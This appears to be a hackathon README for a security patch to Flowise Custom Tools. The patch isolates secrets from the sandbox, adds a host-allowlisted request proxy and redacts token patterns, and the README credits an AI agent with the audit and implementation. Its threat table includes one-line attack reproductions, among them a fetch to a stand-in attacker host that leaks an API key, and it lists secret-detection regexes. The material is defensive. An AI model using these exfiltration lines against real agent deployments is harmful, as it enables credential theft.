# Zero-Context Guard for Flowise (IBM Bob Hackathon — Theme 2)

## 1. Project Description (100-word submission field)

> Flowise is end-of-life and ships with a critical class of vulnerabilities: every Custom
> Tool executed by an LLM receives raw `$vars` — workspace secrets, API keys, and
> environment variables — in plain text inside the sandbox. One prompt injection is all an
> attacker needs to exfiltrate them. We modernized this with a **Zero-Context Guard**:
> credentials are resolved server-side and injected only through `$secureRequest`, a
> host-allowlisted proxy that wraps the existing SSRF deny list. A redaction layer strips
> token patterns from every tool output, error, log line, and trace event before it leaves
> the process. Result: 10 confirmed OWASP LLM02 findings closed, 33 new tests, zero
> breaking changes, no new dependencies.

**Word count: 100**

---

## 2. The Problem: Legacy Agent Tools Are a Secret-Exfiltration Vector

Flowise (Apache 2.0, code-frozen 2026-07-29, EOL 2026-08-31) powers LLM agents that call
**Custom Tools** — user-written JavaScript executed inside a Node.js VM. Before this
project, every such tool ran with a `$vars` object in scope containing every workspace
variable, including **runtime variables resolved from `process.env`**. The LLM chooses
which tool to call and what arguments to pass; it can also inject adversarial content via
tool arguments.

This creates a direct, confirmed path to [OWASP LLM02 — Insecure Output Handling][llm02]
and [LLM06 — Sensitive Information Disclosure][llm06]:

| Attack                   | One-line repro                                                                                                                          |
| ------------------------ | --------------------------------------------------------------------------------------------------------------------------------------- |
| **Direct exfiltration**  | Tool code: `return JSON.stringify($vars)` → LLM receives all secrets as a ToolMessage.                                                  |
| **E2B remote leak**      | `$vars` is serialised as `const $vars = {...}` and sent to a third-party VM at e2b.dev where the sandbox can `fetch` any URL.           |
| **SSRF bypass via E2B**  | The NodeVM SSRF deny list is not applied inside E2B. Sandbox code calls native `fetch('https://attacker.example/?k=' + $vars.API_KEY)`. |
| **Error channel leak**   | `JSON.parse($vars.SECRET)` throws; the error message embeds the raw value and is emitted verbatim over SSE.                             |
| **Tracing exfiltration** | LangSmith / LangFuse / Lunary / Arize receive the unredacted tool output through the LangChain callback chain.                          |
| **Runtime env leak**     | A variable named `FLOWISE_SECRETKEY_OVERWRITE` with `type=runtime` places the master encryption key in `$vars`.                         |

An IBM Bob Secret Leak Audit ([`docs/AUDIT.md`](AUDIT.md)) traced **10 confirmed findings**
across 4 sinks: LLM context (S1), tool output to LLM (S2), error messages (S3), and
callbacks/traces/logs (S4). All 10 are evidence-backed with file:line citations and
minimal reproductions.

[llm02]: https://owasp.org/www-project-top-10-for-large-language-model-applications/
[llm06]: https://owasp.org/www-project-top-10-for-large-language-model-applications/

---

## 3. The Solution: Zero-Context Guard

The guard has two independent layers. Neither introduces new runtime dependencies.

### Layer 1 — Secret Isolation (F-01, F-02, F-03, F-05)

**`$vars` is removed from the sandbox scope when a tool declares secret bindings.**
In its place, an admin-declared `SecretBinding` array maps a short name to a
`credentialId` and an `allowedHosts` list. At call time the guard builds a
`$secureRequest` closure and injects it:

```
SecretBinding {
  name:         "github"               // only thing the LLM or sandbox sees
  credentialId: "cred-uuid-…"          // stays in the host process, never in sandbox
  allowedHosts: ["api.github.com"]     // exact-hostname check, no substring match
}
```

**Data flow:**

```
LLM calls tool
  → _call() in core.ts
      → makeSecureRequestHelper(bindings, options)   [guardRequest.ts]
          → returns $secureRequest closure (never enters sandbox as data)
      → createCodeExecutionSandbox(..., secureRequestHelper)
          → sandbox.$secureRequest = closure
          → sandbox.$vars = *** ABSENT ***
      → executeJavaScriptCode(code, sandbox, { disableE2B: true })

Sandbox code calls:  $secureRequest('github', 'https://api.github.com/user', {})
  → closure runs IN THE HOST PROCESS:
      1. getCredentialData('cred-uuid-…')   → raw token (never touches sandbox)
      2. hostname check: 'api.github.com' ∈ allowedHosts ✓
      3. secureAxiosRequest({url, headers: {Authorization: 'Bearer <token>'}})
           ↳ SSRF deny list checked on every redirect hop  [httpSecurity.ts]
      4. returns clean response body string to sandbox
```

Tools without `secretBindings` are **unchanged** — `$vars` remains in scope, E2B is used
if configured, the sandbox behaves exactly as it did before.

**Runtime environment variable denylist (F-03):** `prepareSandboxVars` now skips any
`runtime`-type variable whose name matches patterns like `SECRET`, `KEY`, `TOKEN`,
`PASSWORD`, `FLOWISE_`, `ENCRYPTION`, etc. This closes the worst-case path
(`FLOWISE_SECRETKEY_OVERWRITE` → master key in `$vars`) globally, for every node type.

### Layer 2 — Redaction Middleware (F-04, F-06, F-08, F-10)

**`redact(text, resolvedSecrets)` in [`guardRedact.ts`](../packages/components/src/guardRedact.ts)**
is a pure function applied at every boundary where strings leave the process:

| Applied at                                     | Protects against                     |
| ---------------------------------------------- | ------------------------------------ |
| `DynamicStructuredTool._call()` return value   | F-02, F-04 — output to LLM and SSE   |
| `DynamicStructuredTool._call()` catch block    | F-06 — error message to agent loop   |
| `CustomStreamingHandler.handleToolEnd()`       | F-04, F-10 — SSE + tracing callbacks |
| `CustomStreamingHandler.handleToolError()`     | F-06 — SSE error payload             |
| `ConsoleCallbackHandler.onToolEnd/onToolError` | F-08 — server logs at verbose level  |

Static patterns caught without needing resolved secrets:

| Pattern                               | Catches                               |
| ------------------------------------- | ------------------------------------- |
| `sk-[A-Za-z0-9_-]{10,}`               | OpenAI API keys                       |
| `ghp_[A-Za-z0-9]{10,}`                | GitHub personal access tokens         |
| `Bearer\s+(?!\[REDACTED)[^\s"',]{8,}` | Any Bearer authorization header value |
| `xoxb-[0-9A-Za-z-]{10,}`              | Slack bot tokens                      |
| `AIza[0-9A-Za-z_-]{35}`               | Google API keys                       |

A negative lookahead on the Bearer pattern prevents double-redaction when an earlier
resolved-secret pass already replaced the token with `[REDACTED]`.

---

## 4. Improvements Made

| #   | Area                                                                             | Before                                                                       | After                                                                             | Finding closed |
| --- | -------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- | --------------------------------------------------------------------------------- | -------------- |
| 1   | Sandbox scope                                                                    | `$vars` with all secrets in scope (E2B + NodeVM)                             | `$vars` absent when `secretBindings` declared; `$secureRequest` injected instead  | F-01, F-02     |
| 2   | E2B remote VM                                                                    | Full `$vars` serialised as `const $vars = {...}` and sent to e2b.dev         | E2B disabled for tools with secret bindings; NodeVM path used                     | F-01, F-05     |
| 3   | SSRF in E2B                                                                      | No deny-list enforcement; sandbox called native `fetch` freely               | Blocked entirely — only `secureAxiosRequest` path available                       | F-05           |
| 4   | Runtime env vars                                                                 | Any `process.env` key accessible via `runtime` variable                      | 14-pattern denylist blocks `SECRET`, `KEY`, `TOKEN`, `PASSWORD`, `FLOWISE_`, etc. | F-03           |
| 5   | Tool output to LLM                                                               | Raw output (potentially containing secrets) returned as ToolMessage          | `redact()` applied before return in `_call()`                                     | F-02, F-04     |
| 6   | SSE `agent_trace` stream                                                         | Raw tool output and error message emitted verbatim                           | `redact()` in `handleToolEnd` and `handleToolError`                               | F-04, F-06     |
| 7   | Server logs                                                                      | `logger.verbose` received raw tool output at `DEBUG=true`                    | `redact()` in `onToolEnd` / `onToolError` before log write                        | F-08           |
| 8   | Tracing providers (LangSmith, LangFuse, Lunary, Arize, Phoenix, LangWatch, Opik) | Received full unredacted tool output via LangChain callback chain            | Receive only post-`handleToolEnd` redacted string                                 | F-10           |
| 9   | Error messages                                                                   | `NodeVM Execution Error: <original error>` could embed raw secret values     | `redact()` applied to caught error before re-throw                                | F-06           |
| 10  | Outbound HTTP from sandbox                                                       | Sandbox could call `$vars.API_KEY` in headers; no server-side auth injection | Auth header injected by host process; sandbox never receives token value          | F-05           |

### What did not change

-   Any Custom Tool with **no** `secretBindings` field behaves identically to before.
-   All 910 pre-existing tests pass without modification.
-   Zero new runtime npm dependencies added.
-   The SSRF deny list, NodeVM `axios`/`node-fetch` wrappers, and `secureAxiosRequest`
    are unchanged and continue to protect non-guard tools.

---

## 5. How IBM Bob Was Used

Bob was not used to search the web or generate prose. It was used as an active engineering
participant on a live codebase, in structured modes, with every claim grounded in file:line
evidence.

### Session 1 — Baseline (Agent mode)

Bob ran `node --version`, `pnpm install`, `pnpm build`, and the full test suite, then wrote
[`docs/BASELINE.md`](BASELINE.md) recording Node v24.11.0, pnpm 10.30.3, build 6/6,
910 tests passing, 0 pre-existing failures. This established a clean reference point before
any source changes.

### Session 2 — Audit (Secret Leak Auditor mode)

Bob read and traversed the following files **without any guessing**:

-   [`src/utils.ts`](../packages/components/src/utils.ts) — `getCredentialData`, `prepareSandboxVars`, `createCodeExecutionSandbox`, `executeJavaScriptCode` (E2B and NodeVM branches)
-   [`nodes/tools/CustomTool/core.ts`](../packages/components/nodes/tools/CustomTool/core.ts) — `DynamicStructuredTool.call()`, `_call()`
-   [`src/handler.ts`](../packages/components/src/handler.ts) — `handleToolEnd`, `handleToolError`, `onToolEnd`, `onToolError`, `additionalCallbacks`
-   [`src/httpSecurity.ts`](../packages/components/src/httpSecurity.ts) — `secureAxiosRequest`, `secureFetch`, `checkDenyList`

It produced [`docs/AUDIT.md`](AUDIT.md): 10 confirmed findings (F-01–F-10) with file:line
evidence, severity ratings, minimal reproductions, and 5 disproved claims.

### Session 3 — Design (Plan mode)

Bob authored [`docs/DESIGN.md`](DESIGN.md) — 337 lines covering the `SecretBinding` type,
the full call-time data flow diagram, the E2B strategy (disable for tools with bindings),
the `BLOCKED_ENV_KEY_PATTERNS` denylist, the redaction middleware specification, backward
compatibility rules, an 8-subtask breakdown, and an audit traceability table mapping each
finding to the mechanism that closes it. Three open design questions were raised and
answered explicitly before implementation began.

### Session 4 — Implementation (Guard Engineer mode, TDD)

Bob implemented the guard test-first, in 7 sequential subtasks:

1. Wrote 20 failing tests in [`src/guardRedact.test.ts`](../packages/components/src/guardRedact.test.ts), then implemented [`src/guardRedact.ts`](../packages/components/src/guardRedact.ts). Fixed one real bug discovered mid-cycle: a negative lookahead was needed to prevent the Bearer pattern from re-matching `Bearer [REDACTED]` after a resolved-secret pass.

2. Wrote 13 failing tests in [`src/guardRequest.test.ts`](../packages/components/src/guardRequest.test.ts), then implemented [`src/guardRequest.ts`](../packages/components/src/guardRequest.ts). Tests include subdomain bypass rejection, empty allowlist guard, and explicit checks that `credentialId` and the resolved secret value never appear in error messages.

3. Modified [`src/utils.ts`](../packages/components/src/utils.ts): added `BLOCKED_ENV_KEY_PATTERNS`, the skip logic in `prepareSandboxVars`, the `secureRequestHelper` parameter in `createCodeExecutionSandbox`, and the `disableE2B` flag in `executeJavaScriptCode`. Ran the 54 existing `utils.test.ts` tests — all passed.

4. Modified [`core.ts`](../packages/components/nodes/tools/CustomTool/core.ts) and [`CustomTool.ts`](../packages/components/nodes/tools/CustomTool/CustomTool.ts): added `secretBindings`, `setSecretBindings()`, `setExecutionOptions()`, wired the helper, and applied `redact()` on outputs and errors.

5. Modified [`handler.ts`](../packages/components/src/handler.ts): applied `redact()` in all four callback methods.

6. Ran the full suite: **943 tests, 0 failures, 22 suites**. The pre-commit hooks (prettier, eslint, lint-staged) ran and passed automatically. Bob committed as `8c485a9d`.

### Measurable Bob contribution

| Activity                                                            | Bob's role                                               | Human role                |
| ------------------------------------------------------------------- | -------------------------------------------------------- | ------------------------- |
| Codebase traversal (utils.ts, core.ts, handler.ts, httpSecurity.ts) | Read all files, cited every claim                        | None required             |
| Audit table (10 findings, 5 disproved)                              | Authored [`docs/AUDIT.md`](AUDIT.md)                     | Reviewed                  |
| Architecture design                                                 | Authored [`docs/DESIGN.md`](DESIGN.md)                   | Signed off on 3 decisions |
| TDD implementation                                                  | Wrote tests first, then implementations                  | None                      |
| Bug discovery                                                       | Found Bearer double-redaction bug during red-green cycle | None                      |
| Test validation                                                     | Ran `jest` after every subtask                           | None                      |
| Commit authorship                                                   | Staged, wrote commit message, committed                  | None                      |

Every claim in this document is backed by a file in this repository. No numbers were
invented. See [`docs/BOB_LOG.md`](BOB_LOG.md) for the per-session log.

---

## 6. Repository Structure

```
packages/components/
  src/
    guardRedact.ts          ← NEW: pure redact() function
    guardRedact.test.ts     ← NEW: 20 tests
    guardRequest.ts         ← NEW: makeSecureRequestHelper factory
    guardRequest.test.ts    ← NEW: 13 tests
    utils.ts                ← MODIFIED: denylist, sandbox flags
    handler.ts              ← MODIFIED: redact() in 4 callback methods
  nodes/tools/CustomTool/
    core.ts                 ← MODIFIED: secretBindings, $secureRequest wiring
    CustomTool.ts           ← MODIFIED: parse + attach bindings

docs/
  BASELINE.md               ← pre-change environment + test baseline
  AUDIT.md                  ← 10 confirmed findings, 5 disproved
  DESIGN.md                 ← full technical specification
  BOB_LOG.md                ← per-session IBM Bob usage log
  HACKATHON_README.md       ← this file
```

## 7. Running the Tests

```bash
pnpm install
cd packages/components
npx jest --forceExit --testTimeout=60000
# Expected: Test Suites: 22 passed, Tests: 943 passed, 0 failed
```

---

_Branch: `zero-context-guard` · Commit: `8c485a9d` · IBM Bob Hackathon 2025 · Theme 2: Modernize What Matters_
